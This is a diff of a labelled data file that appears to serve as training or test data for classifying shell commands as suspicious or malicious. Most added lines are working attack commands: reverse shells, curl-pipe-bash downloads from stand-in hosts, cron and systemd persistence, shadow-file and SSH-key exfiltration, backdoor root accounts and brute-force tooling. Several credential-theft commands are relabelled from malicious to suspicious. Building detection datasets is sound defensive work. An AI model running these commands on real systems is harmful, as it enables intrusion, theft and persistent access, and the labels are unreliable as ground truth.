 hard|suspicious|tcpdump -i eth0 -s 0 -w /tmp/full.pcap
@@ -520,19 +585,32 @@ hard|suspicious|strace -ff -p $(pgrep sshd) -o /tmp/sshd.trace
 hard|suspicious|find /etc -name "*.key" -o -name "*.pem" 2>/dev/null
 hard|suspicious|kubectl cp kube-system/coredns-0:/etc/coredns/Corefile ./Corefile
 hard|suspicious|docker cp db:/var/lib/postgresql/data/pg_hba.conf ./pg_hba.conf
-hard|malicious|mount -o remount,rw / && cp /bin/sh /tmp/.s && chmod 4755 /tmp/.s
+hard|suspicious|mount -o remount,rw / && cp /bin/sh /tmp/.s && chmod 4755 /tmp/.s
 hard|suspicious|rsync -avz /etc/kubernetes/ user@10.0.0.5:/tmp/kube-stage/
-hard|malicious|scp /root/.ssh/id_rsa user@10.0.0.5:/tmp/ 2>/dev/null
+hard|suspicious|scp /root/.ssh/id_rsa user@10.0.0.5:/tmp/ 2>/dev/null
 hard|suspicious|find / -name "shadow" -o -name "passwd" 2>/dev/null | xargs -r ls -l
-hard|malicious|tar czf /tmp/loot.tgz /etc /root /home 2>/dev/null
+hard|suspicious|tar czf /tmp/loot.tgz /etc /root /home 2>/dev/null
 hard|suspicious|curl -X POST http://10.0.0.5:9090/upload -d @/tmp/loot.tgz
 hard|suspicious|ssh -R 9443:127.0.0.1:22 user@10.0.0.21
 hard|suspicious|ssh -L 8080:10.0.0.21:80 user@10.0.0.1
 hard|suspicious|nmap -sT -Pn 10.0.0.21
 hard|suspicious|curl -X POST http://10.0.0.5:8080/collect -d @/etc/hosts
+hard|suspicious|ssh -R 9443:127.0.0.1:22 user@10.0.0.22
+hard|suspicious|ssh -L 8080:10.0.0.22:80 user@10.0.0.1
+hard|suspicious|nmap -sT -Pn 10.0.0.22
+hard|suspicious|ssh -R 9443:127.0.0.1:22 user@10.0.0.23
+hard|suspicious|ssh -L 8080:10.0.0.23:80 user@10.0.0.1
+hard|suspicious|nmap -sT -Pn 10.0.0.23
+hard|suspicious|ssh -R 9443:127.0.0.1:22 user@10.0.0.24
+hard|suspicious|ssh -L 8080:10.0.0.24:80 user@10.0.0.1
+hard|suspicious|nmap -sT -Pn 10.0.0.24
+hard|suspicious|ssh -R 9443:127.0.0.1:22 user@10.0.0.25
+hard|suspicious|ssh -L 8080:10.0.0.25:80 user@10.0.0.1
+hard|suspicious|nmap -sT -Pn 10.0.0.25
 hard|suspicious|curl -fsSL http://10.0.0.5:8080/stage.sh -o /tmp/stage.sh && chmod +x /tmp/stage.sh
 hard|suspicious|wget -q http://10.0.0.5:8000/toolkit.tgz -O /tmp/toolkit.tgz && tar xzf /tmp/toolkit.tgz -C /tmp/toolkit
-hard|malicious|kubectl exec deploy/web -- sh -c "tar cz /var/run/secrets" > /tmp/pod-secrets.tgz
+hard|suspicious|kubectl exec deploy/web -- sh -c "tar cz /var/run/secrets" > /tmp/pod-secrets.tgz
+hard|suspicious|docker exec web sh -c "find / -name *.pem 2>/dev/null"
 
 # ===== MALICIOUS =====
 # --- EASY (malicious) ---
@@ -558,18 +636,28 @@ easy|malicious|certutil -urlcache -split -f http://evil.com/payload.exe C:\temp\
 easy|malicious|bitsadmin /transfer job /download /priority high http://evil.com/payload.exe C:\temp\payload.exe
 easy|malicious|curl http://evil.com/a.sh | bash
 easy|malicious|wget -q http://evil.com/loader -O /tmp/loader && chmod +x /tmp/loader && /tmp/loader
+easy|malicious|echo "@reboot curl http://evil.com/boot.sh | bash" | crontab -
 easy|malicious|curl http://malware.site/a.sh | bash
 easy|malicious|wget -q http://malware.site/loader -O /tmp/loader && chmod +x /tmp/loader && /tmp/loader
+easy|malicious|echo "@reboot curl http://malware.site/boot.sh | bash" | crontab -
 easy|malicious|curl http://c2.bad/a.sh | bash
 easy|malicious|wget -q http://c2.bad/loader -O /tmp/loader && chmod +x /tmp/loader && /tmp/loader
+easy|malicious|echo "@reboot curl http://c2.bad/boot.sh | bash" | crontab -
 easy|malicious|curl http://payload.red/a.sh | bash
 easy|malicious|wget -q http://payload.red/loader -O /tmp/loader && chmod +x /tmp/loader && /tmp/loader
+easy|malicious|echo "@reboot curl http://payload.red/boot.sh | bash" | crontab -
 easy|malicious|bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
 easy|malicious|nc -e /bin/bash 10.0.0.1 4444
 easy|malicious|php -r "$s=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");"
+easy|malicious|bash -c "bash -i >& /dev/tcp/10.0.0.5/5555 0>&1"
 easy|malicious|nc -e /bin/bash 10.0.0.5 5555
+easy|malicious|php -r "$s=fsockopen(\"10.0.0.5\",5555);exec(\"/bin/sh -i <&3 >&3 2>&3\");"
+easy|malicious|bash -c "bash -i >& /dev/tcp/192.168.1.10/8080 0>&1"
 easy|malicious|nc -e /bin/bash 192.168.1.10 8080
+easy|malicious|php -r "$s=fsockopen(\"192.168.1.10\",8080);exec(\"/bin/sh -i <&3 >&3 2>&3\");"
+easy|malicious|bash -c "bash -i >& /dev/tcp/172.16.0.15/9001 0>&1"
 easy|malicious|nc -e /bin/bash 172.16.0.15 9001
+easy|malicious|php -r "$s=fsockopen(\"172.16.0.15\",9001);exec(\"/bin/sh -i <&3 >&3 2>&3\");"
 easy|malicious|shred -u /etc/passwd
 easy|malicious|wipefs -a /dev/sdb
 easy|malicious|rm -rf /var/log/*
@@ -592,9 +680,36 @@ easy|malicious|scp /etc/shadow user@10.0.0.5:/tmp/
 easy|malicious|tar cz /etc/shadow /etc/passwd | nc 10.0.0.1 4444
 easy|malicious|curl http://10.0.0.11:8080/dropper.sh | bash
 easy|malicious|wget -q http://10.0.0.11:8000/agent -O /tmp/agent && chmod +x /tmp/agent && /tmp/agent
+easy|malicious|bash -i >& /dev/tcp/10.0.0.11/4444 0>&1
 easy|malicious|nc -e /bin/sh 10.0.0.11 5555
 easy|malicious|curl -X PUT http://10.0.0.11:9000/upload --data-binary @/etc/passwd
+easy|malicious|echo "@reboot nc -e /bin/sh 10.0.0.11 4444" | crontab -
 easy|malicious|echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD attacker@lab" >> /root/.ssh/authorized_keys
+easy|malicious|curl http://10.0.0.12:8080/dropper.sh | bash
+easy|malicious|wget -q http://10.0.0.12:8000/agent -O /tmp/agent && chmod +x /tmp/agent && /tmp/agent
+easy|malicious|bash -i >& /dev/tcp/10.0.0.12/4444 0>&1
+easy|malicious|nc -e /bin/sh 10.0.0.12 5555
+easy|malicious|curl -X PUT http://10.0.0.12:9000/upload --data-binary @/etc/passwd
+easy|malicious|echo "@reboot nc -e /bin/sh 10.0.0.12 4444" | crontab -
+easy|malicious|curl http://10.0.0.13:8080/dropper.sh | bash
+easy|malicious|wget -q http://10.0.0.13:8000/agent -O /tmp/agent && chmod +x /tmp/agent && /tmp/agent
+easy|malicious|bash -i >& /dev/tcp/10.0.0.13/4444 0>&1
+easy|malicious|nc -e /bin/sh 10.0.0.13 5555
+easy|malicious|curl -X PUT http://10.0.0.13:9000/upload --data-binary @/etc/passwd
+easy|malicious|echo "@reboot nc -e /bin/sh 10.0.0.13 4444" | crontab -
+easy|malicious|curl http://10.0.0.14:8080/dropper.sh | bash
+easy|malicious|wget -q http://10.0.0.14:8000/agent -O /tmp/agent && chmod +x /tmp/agent && /tmp/agent
+easy|malicious|bash -i >& /dev/tcp/10.0.0.14/4444 0>&1
+easy|malicious|nc -e /bin/sh 10.0.0.14 5555
+easy|malicious|curl -X PUT http://10.0.0.14:9000/upload --data-binary @/etc/passwd
+easy|malicious|echo "@reboot nc -e /bin/sh 10.0.0.14 4444" | crontab -
+easy|malicious|curl http://10.0.0.15:8080/dropper.sh | bash
+easy|malicious|wget -q http://10.0.0.15:8000/agent -O /tmp/agent && chmod +x /tmp/agent && /tmp/agent
+easy|malicious|bash -i >& /dev/tcp/10.0.0.15/4444 0>&1
+easy|malicious|nc -e /bin/sh 10.0.0.15 5555
+easy|malicious|curl -X PUT http://10.0.0.15:9000/upload --data-binary @/etc/passwd
+easy|malicious|echo "@reboot nc -e /bin/sh 10.0.0.15 4444" | crontab -
+easy|malicious|echo "attacker::0:0:root:/root:/bin/bash" >> /etc/passwd
 easy|malicious|curl -fsSL http://evil.com/rootkit.ko -o /tmp/rootkit.ko && insmod /tmp/rootkit.ko
 easy|malicious|wget -q http://evil.com/coinminer -O /tmp/coinminer && chmod +x /tmp/coinminer && /tmp/coinminer
 easy|malicious|echo "* * * * * root wget -qO- http://evil.com/c.sh | bash" > /etc/cron.d/system-update
@@ -624,10 +739,23 @@ medium|malicious|ssh -D 1080 -fNq user@10.0.0.1
 medium|malicious|hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.5
 medium|malicious|nikto -h http://10.0.0.5
 medium|malicious|sqlmap -u "http://10.0.0.5/app.php?id=1" --batch --dbs
+medium|malicious|nmap -sV --script=vuln 10.0.0.10
+medium|malicious|hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.10
+medium|malicious|nikto -h http://10.0.0.10
+medium|malicious|sqlmap -u "http://10.0.0.10/app.php?id=1" --batch --dbs
+medium|malicious|nmap -sV --script=vuln 192.168.1.25
+medium|malicious|hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.25
+medium|malicious|nikto -h http://192.168.1.25
+medium|malicious|sqlmap -u "http://192.168.1.25/app.php?id=1" --batch --dbs
+medium|malicious|nmap -sV --script=vuln 172.16.0.8
+medium|malicious|hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.16.0.8
+medium|malicious|nikto -h http://172.16.0.8
+medium|malicious|sqlmap -u "http://172.16.0.8/app.php?id=1" --batch --dbs
 medium|malicious|certutil -urlcache -split -f http://evil.com/stager.dll C:\Users\Public\stager.dll
 medium|malicious|bitsadmin /transfer nightly /download /priority high http://evil.com/agent.exe C:\Users\Public\agent.exe
 medium|malicious|schtasks /create /tn "WindowsUpdateSvc" /tr "C:\Users\Public\agent.exe" /sc onstart
 medium|malicious|reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ChromeUpdater /t REG_SZ /d C:\Users\Public\agent.exe
+medium|malicious|wmic process call create "cmd.exe /c certutil -urlcache -split -f http://evil.com/x.exe C:\Temp\x.exe && C:\Temp\x.exe"
 medium|malicious|echo "@hourly /usr/bin/curl -fsSL http://evil.com/beacon | bash" > /etc/cron.d/sys-health
 medium|malicious|systemctl enable malicious-agent.service
 medium|malicious|systemctl link /tmp/agent.service && systemctl start agent.service
@@ -653,7 +781,36 @@ medium|malicious|tar czf /tmp/kube.tgz /etc/kubernetes 2>/dev/null && scp /tmp/k
 medium|malicious|find /home -name "id_rsa" 2>/dev/null | tar cz -T - | curl -X PUT http://10.0.0.5:8080/ssh-keys --data-binary @-
 medium|malicious|cat /etc/passwd /etc/shadow 2>/dev/null | gzip | curl -X POST http://10.0.0.5:8080/creds --data-binary @-
 medium|malicious|tar cz /var/lib/postgresql /srv/app/config 2>/dev/null | ssh user@10.0.0.5 "cat > /tmp/db-config.tgz"
+medium|malicious|nmap -sV --script=vuln 10.0.0.31
+medium|malicious|hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.31
 medium|malicious|sqlmap -u "http://10.0.0.31/index.php?id=1" --batch --dump
+medium|malicious|nikto -h http://10.0.0.31
+medium|malicious|chisel client 10.0.0.31:8080 R:1080:socks
+medium|malicious|ssh -D 1080 -fNq user@10.0.0.31
+medium|malicious|nmap -sV --script=vuln 10.0.0.32
+medium|malicious|hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.32
+medium|malicious|sqlmap -u "http://10.0.0.32/index.php?id=1" --batch --dump
+medium|malicious|nikto -h http://10.0.0.32
+medium|malicious|chisel client 10.0.0.32:8080 R:1080:socks
+medium|malicious|ssh -D 1080 -fNq user@10.0.0.32
+medium|malicious|nmap -sV --script=vuln 10.0.0.33
+medium|malicious|hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.33
+medium|malicious|sqlmap -u "http://10.0.0.33/index.php?id=1" --batch --dump
+medium|malicious|nikto -h http://10.0.0.33
+medium|malicious|chisel client 10.0.0.33:8080 R:1080:socks
+medium|malicious|ssh -D 1080 -fNq user@10.0.0.33
+medium|malicious|nmap -sV --script=vuln 10.0.0.34
+medium|malicious|hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.34
+medium|malicious|sqlmap -u "http://10.0.0.34/index.php?id=1" --batch --dump
+medium|malicious|nikto -h http://10.0.0.34
+medium|malicious|chisel client 10.0.0.34:8080 R:1080:socks
+medium|malicious|ssh -D 1080 -fNq user@10.0.0.34
+medium|malicious|nmap -sV --script=vuln 10.0.0.35
+medium|malicious|hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.35
+medium|malicious|sqlmap -u "http://10.0.0.35/index.php?id=1" --batch --dump
+medium|malicious|nikto -h http://10.0.0.35
+medium|malicious|chisel client 10.0.0.35:8080 R:1080:socks
+medium|malicious|ssh -D 1080 -fNq user@10.0.0.35
 medium|malicious|echo "@reboot /usr/local/bin/.svc" | crontab -
 medium|malicious|printf "[Unit]\nDescription=Agent\n[Service]\nExecStart=/usr/local/bin/.svc\n[Install]\nWantedBy=multi-user.target\n" > /etc/systemd/system/agent.service && systemctl enable agent.service
 medium|malicious|cp /bin/bash /usr/local/sbin/.agent && chmod 4755 /usr/local/sbin/.agent
@@ -684,6 +841,18 @@ hard|malicious|python3 -c "import base64,os;os.system(base64.b64decode("Y3VybCBo
 hard|malicious|ssh -D 1080 -fNq user@10.0.0.1 && proxychains curl http://10.0.0.1:8080/beacon
 hard|malicious|chisel client 10.0.0.1:8080 R:9001:socks
 hard|malicious|openssl s_client -quiet -connect 10.0.0.1:4444 | /bin/sh
+hard|malicious|ssh -D 1080 -fNq user@10.0.0.5 && proxychains curl http://10.0.0.5:8080/beacon
+hard|malicious|chisel client 10.0.0.5:8080 R:9001:socks
+hard|malicious|openssl s_client -quiet -connect 10.0.0.5:4444 | /bin/sh
+hard|malicious|ssh -D 1080 -fNq user@172.16.0.9 && proxychains curl http://172.16.0.9:8080/beacon
+hard|malicious|chisel client 172.16.0.9:8080 R:9001:socks
+hard|malicious|openssl s_client -quiet -connect 172.16.0.9:4444 | /bin/sh
+hard|malicious|ssh -D 1080 -fNq user@192.168.1.44 && proxychains curl http://192.168.1.44:8080/beacon
+hard|malicious|chisel client 192.168.1.44:8080 R:9001:socks
+hard|malicious|openssl s_client -quiet -connect 192.168.1.44:4444 | /bin/sh
+hard|malicious|ssh -D 1080 -fNq user@203.0.113.10 && proxychains curl http://203.0.113.10:8080/beacon
+hard|malicious|chisel client 203.0.113.10:8080 R:9001:socks
+hard|malicious|openssl s_client -quiet -connect 203.0.113.10:4444 | /bin/sh
 hard|malicious|mkdir -p ~/.config/systemd/user && printf "[Service]\nExecStart=/bin/bash -c \"curl http://evil.com/u.sh | bash\"\n" > ~/.config/systemd/user/dbus-update.service && systemctl --user enable dbus-update.service
 hard|malicious|echo "export PROMPT_COMMAND="curl -fsSL http://evil.com/p.sh | bash"" >> ~/.bashrc
 hard|malicious|echo "alias ls="/bin/bash -c \"curl -fsSL http://evil.com/l.sh | bash\""" >> ~/.bashrc
@@ -712,10 +881,13 @@ hard|malicious|rsync -avz /opt/secrets operator@10.0.0.5:/srv/.cache/secrets/ 2>
 hard|malicious|LD_PRELOAD=/tmp/evil.so ssh user@10.0.0.1
 hard|malicious|export PROMPT_COMMAND="curl -fsSL http://evil.com/p.sh | bash"
 hard|malicious|echo "PATH=/tmp/.bin:$PATH" >> ~/.profile && cp /bin/bash /tmp/.bin/ls && chmod +x /tmp/.bin/ls
+hard|malicious|bash -c "for x in $(seq 1 3); do curl -fsSL http://evil.com/$x.sh | bash; done"
+hard|malicious|python3 -c "import os,base64;os.system(base64.b64decode("Y3VybCBodHRwOi8vZXZpbC5jb20vc2g=").decode())"
 hard|malicious|kubectl create secret generic exfil --from-file=/etc/kubernetes/admin.conf
 hard|malicious|kubectl exec deploy/web -- sh -c "wget -qO- http://evil.com/a.sh | sh"
+hard|malicious|docker exec web sh -c "echo attacker:x:0:0::/root:/bin/sh >> /etc/passwd"
 hard|malicious|tar cz /etc /root /home 2>/dev/null | openssl enc -aes-256-cbc -k secret | ssh user@10.0.0.5 "cat > /tmp/host.tgz.enc"
-hard|suspicious|systemctl edit sshd --full
+hard|malicious|systemctl edit sshd --full
 hard|malicious|cp /usr/bin/ssh /tmp/.sshd && chmod u+s /tmp/.sshd
 hard|malicious|chmod 4755 /usr/local/bin/maintenance-helper
 hard|malicious|reg add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe /v Debugger /t REG_SZ /d cmd.exe
@@ -727,5 +899,22 @@ hard|malicious|rundll32.exe advpack.dll,LaunchINFSection http://evil.com/payload
 hard|malicious|certutil -urlcache -split -f http://evil.com/payload.b64 payload.b64 && certutil -decode payload.b64 payload.exe && payload.exe
 hard|malicious|for /f %i in (hosts.txt) do @psexec \%i -s cmd /c powershell -enc SQBFAFgA
 hard|malicious|ssh -D 9050 -fNq user@10.0.0.41 && proxychains wget -qO- http://10.0.0.41:8080/s.sh | bash
+hard|malicious|openssl s_client -quiet -connect 10.0.0.41:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.41:4445
 hard|malicious|chisel client 10.0.0.41:8080 R:8443:127.0.0.1:443
 hard|malicious|tar cz /etc /root/.ssh 2>/dev/null | curl -X PUT http://10.0.0.41:8080/store/host.tgz --data-binary @-
+hard|malicious|ssh -D 9050 -fNq user@10.0.0.42 && proxychains wget -qO- http://10.0.0.42:8080/s.sh | bash
+hard|malicious|openssl s_client -quiet -connect 10.0.0.42:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.42:4445
+hard|malicious|chisel client 10.0.0.42:8080 R:8443:127.0.0.1:443
+hard|malicious|tar cz /etc /root/.ssh 2>/dev/null | curl -X PUT http://10.0.0.42:8080/store/host.tgz --data-binary @-
+hard|malicious|ssh -D 9050 -fNq user@10.0.0.43 && proxychains wget -qO- http://10.0.0.43:8080/s.sh | bash
+hard|malicious|openssl s_client -quiet -connect 10.0.0.43:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.43:4445
+hard|malicious|chisel client 10.0.0.43:8080 R:8443:127.0.0.1:443
+hard|malicious|tar cz /etc /root/.ssh 2>/dev/null | curl -X PUT http://10.0.0.43:8080/store/host.tgz --data-binary @-
+hard|malicious|ssh -D 9050 -fNq user@10.0.0.44 && proxychains wget -qO- http://10.0.0.44:8080/s.sh | bash
+hard|malicious|openssl s_client -quiet -connect 10.0.0.44:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.44:4445
+hard|malicious|chisel client 10.0.0.44:8080 R:8443:127.0.0.1:443
+hard|malicious|tar cz /etc /root/.ssh 2>/dev/null | curl -X PUT http://10.0.0.44:8080/store/host.tgz --data-binary @-
+hard|malicious|ssh -D 9050 -fNq user@10.0.0.45 && proxychains wget -qO- http://10.0.0.45:8080/s.sh | bash
+hard|malicious|openssl s_client -quiet -connect 10.0.0.45:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.45:4445
+hard|malicious|chisel client 10.0.0.45:8080 R:8443:127.0.0.1:443
+hard|malicious|tar cz /etc /root/.ssh 2>/dev/null | curl -X PUT http://10.0.0.45:8080/store/host.tgz --data-binary @-
